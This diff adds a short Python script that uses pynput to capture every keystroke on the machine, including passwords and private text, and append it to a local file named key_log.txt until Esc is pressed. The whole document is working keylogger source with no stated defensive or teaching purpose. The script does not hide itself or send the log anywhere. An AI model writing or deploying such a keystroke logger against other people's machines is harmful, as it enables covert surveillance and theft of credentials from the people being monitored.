@@ -1,0 +1,27 @@
+from pynput.keyboard import Key, Listener
+
+# Path to the log file
+log_file = "key_log.txt"
+
+def on_press(key):
+    # Convert the key press to a string and log it
+    with open(log_file, "a") as log:
+        try:
+            log.write(f"{key.char}")
+        except AttributeError:
+            # Handle special keys like 'Enter', 'Space', etc.
+            if key == Key.space:
+                log.write(" ")
+            elif key == Key.enter:
+                log.write("\n")
+            else:
+                log.write(f" [{key}] ")
+
+def on_release(key):
+    # Stop listener when Esc is pressed
+    if key == Key.esc:
+        return False
+
+# Start listening for key presses
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
